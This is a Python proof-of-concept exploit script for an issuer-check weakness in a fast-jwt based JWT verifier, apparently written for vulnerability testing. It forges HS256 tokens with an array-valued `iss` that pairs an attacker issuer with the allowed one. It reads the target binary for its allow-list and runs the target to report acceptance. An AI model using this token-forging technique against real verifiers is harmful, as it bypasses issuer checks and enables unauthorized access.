#!/usr/bin/env python3
"""
PoC: JWT claim-validation weakness in a fast-jwt based verifier.

The target verifies HS256 JWTs and enforces an issuer allow-list, configured as
    createVerifier({ key, allowedIss: ["https://valid-iss"] })

fast-jwt registers the `iss` validator WITHOUT `array: true`, yet its verify
loop still coerces any claim value into an array and accepts the claim when
*any* element matches the allow-list:

    const values = Array.isArray(value) ? value : [value];
    ...
    if (!values.some(v => allowed.some(a => a.test(v)))) throw ...

RFC 7519 defines `iss` as a single StringOrURI whose value must equal the
trusted issuer. By presenting `iss` as an ARRAY that contains a disallowed
issuer alongside the one allowed issuer, the token is accepted by the target
even though it carries an issuer value the policy does not allow. A strict,
spec-conformant verifier rejects it (an array `iss` is malformed, and the
carried `https://…/evil` issuer is untrusted).

This script:
  1. generates the verification secret at runtime,
  2. statically inspects the target to discover the allowed `iss` value(s),
  3. behaviourally probes the target to confirm which single `iss` value it
     accepts and that the chosen "evil" issuer is rejected on its own,
  4. deterministically builds the final array-form token,
  5. performs one final verification run and reports the binary's own result.

It NEVER asserts a verdict: whether the target accepts or rejects the token,
the run is reported faithfully in the JSON contract (error stays null, exit 0),
so the same script works against both vulnerable and fixed builds.
"""

import argparse
import base64
import hashlib
import hmac
import json
import re
import signal
import subprocess
import sys
import time

# Deterministic, self-contained verification secret. The target verifies the
# token against whatever we pass via --key, so we sign with this same value.
SECRET = "poc-hs256-shared-secret"

# A clearly-untrusted issuer value used as the disallowed element of the array.
# Any value outside the allow-list works; this one is confirmed rejected on its
# own during discovery.
EVIL_ISS = "https://poc-attacker.example/evil"

# Bounds to keep the run deterministic and small.
MAX_CANDIDATES = 8
OUTPUT_CAP = 200_000


def b64u(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def make_jwt(payload, secret):
    header = {"alg": "HS256", "typ": "JWT"}
    seg = (
        b64u(json.dumps(header, separators=(",", ":")))
        + "."
        + b64u(json.dumps(payload, separators=(",", ":")))
    )
    sig = hmac.new(secret.encode("utf-8"), seg.encode("ascii"), hashlib.sha256).digest()
    return seg + "." + b64u(sig)


def run_target(binary, token, secret, timeout):
    """Run the target once. Returns a dict with the raw run details.

    Never raises for a rejected token; only records execution-level problems
    (could not start, timed out, no parseable JSON) via the returned dict.
    """
    command = [binary, "--token", token, "--key", secret]
    started = time.monotonic()
    result = {
        "command": command,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "parsed": None,   # parsed stdout JSON (dict) or None
        "error": None,    # script-level execution failure message or None
    }
    try:
        proc = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired as exc:
        result["runtime_ms"] = int((time.monotonic() - started) * 1000)
        result["timed_out"] = True
        result["stdout"] = (exc.stdout or "") if isinstance(exc.stdout, str) else (
            exc.stdout.decode("utf-8", "replace") if exc.stdout else ""
        )
        result["stderr"] = (exc.stderr or "") if isinstance(exc.stderr, str) else (
            exc.stderr.decode("utf-8", "replace") if exc.stderr else ""
        )
        result["error"] = "target timed out after {} seconds".format(timeout)
        return result
    except (OSError, ValueError) as exc:
        result["runtime_ms"] = int((time.monotonic() - started) * 1000)
        result["error"] = "could not start target: {}".format(exc)
        return result

    result["runtime_ms"] = int((time.monotonic() - started) * 1000)
    result["stdout"] = proc.stdout or ""
    result["stderr"] = proc.stderr or ""

    rc = proc.returncode
    if rc is not None and rc < 0:
        # Terminated by a signal.
        signum = -rc
        try:
            result["signal"] = signal.Signals(signum).name
        except (ValueError, KeyError):
            result["signal"] = "SIG{}".format(signum)
        result["returncode"] = rc
    else:
        result["returncode"] = rc

    # Parse the last JSON object the binary printed on stdout.
    parsed = parse_result_json(result["stdout"])
    result["parsed"] = parsed
    if parsed is None and result["signal"] is None and not result["timed_out"]:
        result["error"] = "target produced no parseable result JSON on stdout"
    return result


def parse_result_json(text):
    """Extract the JSON object the binary printed. Returns a dict or None."""
    if not text:
        return None
    stripped = text.strip()
    # Fast path: whole stdout is one JSON object.
    try:
        obj = json.loads(stripped)
        if isinstance(obj, dict):
            return obj
    except ValueError:
        pass
    # Fallback: scan for the last balanced top-level {...} span.
    decoder = json.JSONDecoder()
    idx = 0
    found = None
    n = len(stripped)
    while idx < n:
        brace = stripped.find("{", idx)
        if brace == -1:
            break
        try:
            obj, end = decoder.raw_decode(stripped, brace)
            if isinstance(obj, dict):
                found = obj
            idx = end
        except ValueError:
            idx = brace + 1
    return found


def is_accepted(run):
    p = run.get("parsed")
    return isinstance(p, dict) and p.get("ok") is True


def discover_allowed_iss(binary):
    """Statically inspect the target for the configured allowed `iss` values.

    Looks for an `allowedIss: [ ... ]` literal and extracts the quoted strings.
    Returns a de-duplicated, order-preserving list of candidate issuer values.
    """
    candidates = []
    try:
        with open(binary, "rb") as fh:
            blob = fh.read()
    except OSError:
        return candidates

    text = blob.decode("latin-1", "replace")

    # Primary: the createVerifier config literal, e.g.
    #   allowedIss: ["https://valid-iss"]
    for m in re.finditer(r"allowedIss\s*:\s*\[([^\]]{0,500})\]", text):
        for lit in re.findall(r'"((?:[^"\\]|\\.){0,200})"', m.group(1)):
            val = _unescape(lit)
            if val and val not in candidates:
                candidates.append(val)
        for lit in re.findall(r"'((?:[^'\\]|\\.){0,200})'", m.group(1)):
            val = _unescape(lit)
            if val and val not in candidates:
                candidates.append(val)

    return candidates[:MAX_CANDIDATES]


def _unescape(lit):
    try:
        return json.loads('"' + lit.replace('"', '\\"') + '"')
    except ValueError:
        return lit


def select_valid_iss(binary, secret, timeout):
    """Determine an issuer value the target accepts on its own.

    Uses static candidates confirmed by a single-value probe; falls back to a
    conventional default if static inspection yields nothing usable.
    """
    probes = []
    candidates = discover_allowed_iss(binary)

    for cand in candidates:
        run = run_target(binary, make_jwt({"iss": cand}, secret), secret, timeout)
        probes.append(("iss_single:" + cand, run))
        if is_accepted(run):
            return cand, candidates, probes

    # Fallback default (also the value seen in the reference build). Confirm.
    fallback = "https://valid-iss"
    if fallback not in candidates:
        run = run_target(binary, make_jwt({"iss": fallback}, secret), secret, timeout)
        probes.append(("iss_single:" + fallback, run))
        if is_accepted(run):
            return fallback, candidates, probes

    # Nothing confirmed; still return a deterministic best guess so we always
    # produce a token. Discovery outcome is reported, not asserted.
    chosen = candidates[0] if candidates else fallback
    return chosen, candidates, probes


def build_output(binary, final_run):
    parsed = final_run.get("parsed")
    if isinstance(parsed, dict):
        observable_value = json.dumps(parsed, separators=(",", ":"))
    else:
        observable_value = final_run.get("stdout", "") or ""

    def cap(s):
        if s is None:
            return ""
        return s if len(s) <= OUTPUT_CAP else s[:OUTPUT_CAP]

    return {
        "binary": binary,
        "command": final_run["command"],
        "returncode": final_run["returncode"],
        "signal": final_run["signal"],
        "timed_out": final_run["timed_out"],
        "runtime_ms": final_run["runtime_ms"],
        "stdout": cap(final_run["stdout"]),
        "stderr": cap(final_run["stderr"]),
        "observable": {
            "kind": "stdout",
            "value": observable_value,
            "path": None,
        },
        "error": final_run["error"],
    }


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Construct and report a JWT claim-validation PoC token."
    )
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", default=None, help="write JSON result here")
    parser.add_argument("--timeout", type=float, default=30.0,
                        help="per-run timeout in seconds (default 30)")
    args = parser.parse_args(argv)

    binary = args.binary
    timeout = args.timeout

    # --- Discovery (deterministic; independent of the final run outcome) -----
    valid_iss, _candidates, _probes = select_valid_iss(binary, SECRET, timeout)

    # --- Deterministic selection of the final trigger token ------------------
    # Array-form `iss` carrying a disallowed issuer plus the allowed one.
    # The disallowed element comes first so the token clearly asserts an
    # untrusted issuer while still matching the allow-list via the second entry.
    final_payload = {"iss": [EVIL_ISS, valid_iss]}
    final_token = make_jwt(final_payload, SECRET)

    # --- Single final verification run; report exactly what the binary said --
    final_run = run_target(binary, final_token, SECRET, timeout)

    output = build_output(binary, final_run)

    text = json.dumps(output, indent=2)
    if args.json_out:
        try:
            with open(args.json_out, "w") as fh:
                fh.write(text)
        except OSError as exc:
            # Writing the report file failed: surface on stderr but still emit
            # to stdout so the result is not lost.
            sys.stderr.write("could not write --json-out: {}\n".format(exc))
            print(text)
    else:
        print(text)

    return 0


if __name__ == "__main__":
    sys.exit(main())
